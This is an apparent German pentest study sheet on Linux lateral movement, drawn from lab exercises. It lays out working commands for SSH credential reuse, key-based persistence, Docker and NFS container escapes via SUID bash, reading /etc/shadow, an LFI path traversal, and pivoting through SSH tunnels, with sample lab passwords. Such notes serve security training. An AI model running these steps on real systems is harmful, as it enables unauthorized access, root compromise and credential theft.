# Lateral Movement

## 1. Ziel der Phase

- Von einem kompromittierten System zu anderen Systemen im Netzwerk bewegen
- Zugriff auf weitere Ressourcen erlangen
- Netzwerk lateral durchdringen
- Weitere Hosts kompromittieren

---

## 2. Relevante Techniken & Vorgehensweisen

### SSH-basiertes Lateral Movement

- SSH mit gefundenen Credentials
- SSH Key-based Authentication
- SSH Tunneling für Service-Zugriff

### Credential Reuse

- Gefundene Credentials gegen andere Hosts testen
- Database Passwords für System-User
- Config File Credentials für SSH

### Container-zu-Host Movement

- Container Escape via Docker
- NFS Mount Exploitation
- Volume Mount Misconfiguration

### Service Exploitation für Movement

- Internal Service Discovery
- Port Forwarding zu internen Services
- Pivoting via Kompromittiertes System

---

## 3. Betriebssystem-spezifische Aspekte (Linux)

- SSH als primäres Remote-Access Protokoll
- SSH Keys in `~/.ssh/` für Password-less Authentication
- Container-Umgebungen (Docker) mit Host-Interaktion
- Internal Services nur auf 127.0.0.1 erreichbar

---

## 4. Typische Angriffsflächen / Ansatzpunkte

### SSH Access

- Port 22 auf internen Hosts
- Password-based Authentication
- Key-based Authentication
- Password Reuse zwischen Services

### Container-zu-Host

- Docker mit sudo exec Rechten
- Privileged Containers
- Volume Mounts zwischen Container/Host
- NFS mit no_root_squash

### Internal Services

- MySQL/MariaDB (Port 3306)
- Web Services (Port 8080, 3000)
- Custom Applications
- nur auf 127.0.0.1 gebunden

---

## 5. Wichtige Befehle, Tools & Syntax

### SSH Lateral Movement

**Password-based SSH**


```bash
# Mit gefundenen Credentials
ssh user@TARGET_IP
# Password eingeben

# Beispiel
ssh tom@192.168.xx.x
# Password: P@ssw0rd!

ssh alice@192.168.xx.x
# Password: alice1985!

ssh boris@10.10.118.75
# Password: beautiful1
```

**Key-based SSH**


```bash
# Mit extrahiertem Private Key
ssh -i /path/to/private_key user@TARGET_IP

# Beispiel
ssh -i ~/SimpleCyber/rsa.txt alice@192.168.xx.x
```

**SSH Key Setup für Persistence**


```bash
# Auf Angreifer-Maschine: Key generieren
ssh-keygen -t rsa
# Output: rsa.txt, rsa.txt.pub

# Public Key anzeigen
cat rsa.txt.pub

# Auf Zielsystem (als Zieluser)
cd ~/.ssh
touch authorized_keys
nano authorized_keys
# Public Key einfügen
chmod 600 authorized_keys

# Von Angreifer-Maschine connecten
ssh -i rsa.txt user@TARGET_IP
```

### Container-zu-Host Movement

**Docker Exec (mit Sudo-Rechten)**

**Voraussetzung prüfen:**


```bash
sudo -l
# Output: (root) NOPASSWD: /snap/bin/docker exec *
```

**Container-ID ermitteln:**


```bash
# Via hostname im Container
hostname
# Output: e6ff5b1cbc85

# Via LFI
curl "http://TARGET/public/plugins/zipkin/../../../../../../../../etc/hostname" --path-as-is
```

**Als root in Container:**


```bash
sudo /snap/bin/docker exec -it --privileged -u root CONTAINER_ID bash
```

**Host Filesystem mounten:**


```bash
mkdir -p /mnt/host
mount /dev/xvda1 /mnt/host
ls -la /mnt/host
```

**Auf Host-Dateien zugreifen:**


```bash
cat /mnt/host/root/root.txt
cat /mnt/host/etc/shadow
```

**Volume Mount Exploitation (Container → Host)**

**Mount Points identifizieren:**


```bash
# Im Container als root
findmnt | grep "/var/www/html"
# Output: /var/www/html  /dev/root[/opt/limesurvey] ext4  rw
```

**Test: File erstellen:**


```bash
# Im Container
mkdir /var/www/html/survey/test-from-container
echo "Hello from container" > /var/www/html/survey/test-from-container/test.txt
```

**Auf Host prüfen:**


```bash
# Via SSH auf Host
ls -la /opt/limesurvey/test-from-container/
cat /opt/limesurvey/test-from-container/test.txt
```

**SUID Binary für Container Escape:**


```bash
# Im Container als root
cd /var/www/html/survey
cp /bin/bash ./pwn
chmod u+s ./pwn
ls -la pwn
# -rwsr-xr-x 1 root root

# Auf Host (via SSH als unprivileged user)
cd /opt/limesurvey
./pwn -p
whoami
# root
```

### NFS-basiertes Lateral Movement

**NFS Enumeration:**


```bash
showmount -e TARGET_IP
nxc nfs TARGET_IP
# Check für: (root escape:True)
```

**NFS Mount (als root auf Kali):**


```bash
sudo mount -t nfs TARGET_IP:/home/bob mount
```

**SSH Key Extraction:**


```bash
ls -la mount/.ssh/
cat mount/.ssh/id_rsa
cat mount/.ssh/authorized_keys
```

**SUID Binary platzieren:**


```bash
# Als root auf Kali
cp /bin/bash mount/
chmod u+s mount/bash

# Auf Target via SSH
cd ~
./bash -p
whoami
# root
```

### Credential Reuse Testing

**Gefundene Credentials gegen andere User/Hosts:**


```bash
# Config File → SSH
# Beispiel: DB Password = SSH Password
ssh limesvc@TARGET_IP
# Password: 5W5HN4K4GCXf9E

# FTP Creds → SSH
ssh tom@TARGET_IP
# Password: P@ssw0rd!

# Tomcat Config → Root
su root
# Password: H2RR3rGDrbAnPxWa
```

### Internal Network Discovery

**Network Information:**


````bash
# Im Container
ifconfig
ip a
route -n
```

**Beispiel Output:**
```
Interface 2: enp0s3
IPv4 Address: 192.168.xx.x/24

Interface 3: docker0
IPv4 Address: 172.17.0.1/16
````

**Internal Services:**


````bash
ss -tulpn | grep 127.0.0.1
netstat -tulpn | grep 127.0.0.1
```

**Beispiel Output:**
```
tcp   LISTEN  127.0.0.1:3306   (MySQL)
tcp   LISTEN  127.0.0.1:8080   (Web Service)
tcp   LISTEN  127.0.0.1:631    (CUPS)
````

### SSH Port Forwarding für Internal Services

**Local Port Forward (Kali → Target → Internal Service)**


```bash
# Syntax
ssh -L LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT user@TARGET

# Beispiel: MySQL
ssh -L 127.0.0.1:3306:127.0.0.1:3306 alice@192.168.xx.x

# Dann von Kali connecten
mysql -h 127.0.0.1 -u wpuser -p
```

**Remote Port Forward (Target → Kali)**


```bash
# Syntax
ssh -R REMOTE_IP:REMOTE_PORT:LOCAL_IP:LOCAL_PORT user@KALI_IP

# Beispiel: CUPS Service
ssh -R 127.0.0.1:631:127.0.0.1:631 kali@192.168.xx.x

# Dann von Kali im Browser
http://127.0.0.1:631
```

**Port zu anderem Port forwarden:**


```bash
# Local Forward zu anderem Port
ssh -L 127.0.0.1:8888:127.0.0.1:3306 alice@192.168.xx.x

# Dann connecten
mysql -h 127.0.0.1 -u wpuser -p -P 8888

# Remote Forward zu anderem Port
ssh -R 127.0.0.1:4444:127.0.0.1:631 kali@192.168.xx.x

# Dann Browser
http://127.0.0.1:4444
```

**Dynamic Port Forward (SOCKS Proxy)**


````bash
# SOCKS Proxy erstellen
ssh -D 1080 alice@192.168.xx.x

# Proxychains Config
sudo nano /etc/proxychains4.conf
```

**proxychains4.conf:**
```
[ProxyList]
socks5 127.0.0.1 1080
````

**Via Proxychains Tools nutzen:**


```bash
# Firefox
proxychains -q firefox

# Nmap
proxychains -q nmap -sT -p3306 10.xx.xx.x

# MySQL
proxychains -q mysql -h 172.x.x.x -u user -p

# NetExec
proxychains -q nxc ssh 172.x.x.x -u msfadmin -p msfadmin
```

### SSH zu internem Netzwerk (via Pivot)

**Local Forward zu internem Host:**


```bash
# Syntax
ssh -L LOCAL_PORT:INTERNAL_IP:INTERNAL_PORT user@PIVOT_HOST

# Beispiel: SSH zu 172.x.x.x
ssh -L 127.0.0.1:2222:172.x.x.x:22 alice@192.168.xx.x

# Dann von Kali
ssh -p 2222 user@127.0.0.1
```

**Dynamic Forward für internes Netzwerk:**


```bash
# SOCKS Proxy via Pivot
ssh -D 1080 alice@192.168.xx.x

# Dann via Proxychains
proxychains -q nxc ssh 172.x.x.x -u msfadmin -p msfadmin
```

---

## 6. Reihenfolge, Abhängigkeiten & Hinweise

### Standard Lateral Movement Workflow

1. **Credential Discovery**
    - Config Files durchsuchen
    - Environment Variables prüfen
    - Database Credentials extrahieren
2. **Credential Reuse Testing**


```bash
   # Mit gefundenen Credentials
   ssh user@TARGET_IP
```

3. **Network Enumeration**


```bash
   # Internal Networks identifizieren
   ifconfig
   route -n
   ss -tulpn | grep 127.0.0.1
```

4. **SSH Tunneling Setup (falls nötig)**


```bash
   # Für Internal Services
   ssh -L 127.0.0.1:PORT:127.0.0.1:PORT user@TARGET
```

5. **Container-zu-Host (falls in Container)**
    - Docker Rechte prüfen
    - Mount Points analysieren
    - Container Escape ausführen
6. **Persistence etablieren**
    - SSH Keys planten
    - Backdoor Scripts

### Wichtige Hinweise

**SSH Key Permissions**


```bash
# Private Key muss 600 sein
chmod 600 private_key

# Authorized_keys muss 600 sein
chmod 600 ~/.ssh/authorized_keys

# .ssh Directory muss 700 sein
chmod 700 ~/.ssh
```

**Password Reuse Pattern**

- DB Password → SSH Password
- Tomcat Password → Root Password
- FTP Credentials → SSH Credentials
- Container ENV Password → Host User Password

**Container Detection**


```bash
# Indicators
ls -la / | grep .dockerenv
hostname  # Zeigt Container-ID
ps aux    # Limitierte Prozesse
```

**SSH Port Forward: Local vs Remote**

**Local Forward (-L):**

- Kali kann auf Target-Service zugreifen
- Traffic: Kali → SSH → Target → Service
- Use Case: Target hat internen Service, Kali will zugreifen

**Remote Forward (-R):**

- Target kann auf Kali-Service zugreifen
- Traffic: Target → SSH → Kali → Service
- Use Case: Target hat Service, Kali soll es sehen

**Dynamic Forward (-D):**

- SOCKS Proxy für beliebige Connections
- Flexibelste Lösung
- Proxychains nötig für Tools

**Proxychains Configuration**


```bash
# socks4 auskommentieren
#socks4 127.0.0.1 9050

# socks5 aktivieren
socks5 127.0.0.1 1080
```

**SSH Tunnel bleibt im Vordergrund**

- SSH Session muss offen bleiben
- Bei Disconnect: Port Forward bricht ab
- Separate Terminal-Session nutzen

**Internal Network Notation**

- `172.x.x.x/16` = Docker Network
- `192.168.xx.x/24` = Internal Network
- `127.0.0.1` = Localhost Services

**Container-zu-Host Requirements**

- Root im Container (via sudo)
- Shared Volume Mount ODER
- Docker privileged exec ODER
- NFS no_root_squash

**Mount Point Analysis**


````bash
findmnt
# Format: TARGET  SOURCE[/HOST_PATH]
# Beispiel: /var/www/html  /dev/root[/opt/limesurvey]
```

---

## 7. Typische Findings & Fehler

### Häufige Findings

**Credential Reuse erfolgreich**
```
Config: limesvc:5W5HN4K4GCXf9E
→ SSH: limesvc:5W5HN4K4GCXf9E (erfolgreich)

Tomcat: admin:H2RR3rGDrbAnPxWa
→ Root: H2RR3rGDrbAnPxWa (erfolgreich)
```

**SSH Keys in NFS Mounts**
```
/home/bob/.ssh/id_rsa (readable)
→ SSH als bob möglich
```

**Internal Services auf 127.0.0.1**
```
127.0.0.1:3306 (MySQL)
127.0.0.1:8080 (Tomcat)
127.0.0.1:631  (CUPS)
→ Port Forward nötig für Zugriff
```

**Container mit sudo docker exec**
```
sudo -l: (root) NOPASSWD: /snap/bin/docker exec *
→ Privileged Container Access → Host Filesystem
```

**Volume Mounts Container→Host**
```
/var/www/html  →  /opt/limesurvey
→ SUID Binary im Container = SUID auf Host
```

**NFS no_root_squash**
```
showmount: /home/bob *
nxc nfs: (root escape:True)
→ SUID Binary über NFS → Root auf Host
````

### Typische Fehler

**SSH Key Permissions falsch**


```bash
# Fehler
ssh -i private_key user@target
# Permissions 0644 for 'private_key' are too open

# Fix
chmod 600 private_key
```

**SSH Tunnel: Falscher Port**


```bash
# Target hat MySQL auf 3306
# Aber Local Port schon belegt

# Fehler
ssh -L 127.0.0.1:3306:127.0.0.1:3306 user@target
# bind: Address already in use

# Fix: Anderen lokalen Port
ssh -L 127.0.0.1:3307:127.0.0.1:3306 user@target
mysql -h 127.0.0.1 -P 3307 -u user -p
```

**Proxychains Config nicht angepasst**


```bash
# Default Config hat socks4
proxychains firefox
# Connection failed

# Fix: socks5 in Config
sudo nano /etc/proxychains4.conf
# socks5 127.0.0.1 1080
```

**Dynamic Forward ohne Proxychains**


```bash
# SSH -D läuft
ssh -D 1080 user@target

# Aber direkter Tool-Aufruf
nmap 172.x.x.x
# No route to host

# Fix: Via Proxychains
proxychains -q nmap -sT 172.x.x.x
```

**Container Escape: -p Flag vergessen**


```bash
# SUID Binary auf Host
./bash
whoami
# user (nicht root!)

# Fix: -p Flag
./bash -p
whoami
# root
```

**Docker Exec: Container-ID falsch**


```bash
# Falsche ID verwendet
sudo docker exec -it abc123 bash
# Error: No such container

# Fix: Richtige ID ermitteln
hostname  # Im Container
# Oder via LFI
curl "...../etc/hostname" --path-as-is
```

**Mount Point nicht erkannt**


```bash
# Im Container File erstellt
touch /var/www/html/test.txt

# Auf Host nicht gefunden
ls /var/www/html/
# Kein test.txt

# Fehler: Kein Shared Mount
# Fix: findmnt prüfen
findmnt | grep "/var/www/html"
```

**NFS Mount: Als non-root**


```bash
# Mount versucht
mount -t nfs target:/share mount
# Permission denied

# Fix: Als root
sudo mount -t nfs target:/share mount
```

**SSH zu internem Host: Keine Route**


```bash
# Direkt versucht
ssh user@172.x.x.x
# No route to host

# Fix: Via Port Forward oder Dynamic Proxy
ssh -L 2222:172.x.x.x:22 user@PIVOT
ssh -p 2222 user@127.0.0.1
```

**Password Reuse nicht systematisch getestet**


````bash
# Nur einen Host getestet
ssh user@target1  # Failed

# Andere Hosts nicht probiert
# Fix: Alle bekannten Hosts/Users testen
ssh user@target2  # Success!
```

**Credential Format nicht erkannt**
```
# File content
Toms Creds: tom:P@ssw0rd!

# Falsch interpretiert als
Username: Toms
Password: Creds: tom:P@ssw0rd!

# Richtig:
Username: tom
Password: P@ssw0rd!
````

**SSH Tunnel: Session geschlossen**


```bash
# Tunnel gestartet
ssh -L 3306:127.0.0.1:3306 user@target

# Terminal geschlossen
# Port Forward tot

# Fix: Session im Hintergrund oder separates Terminal
```

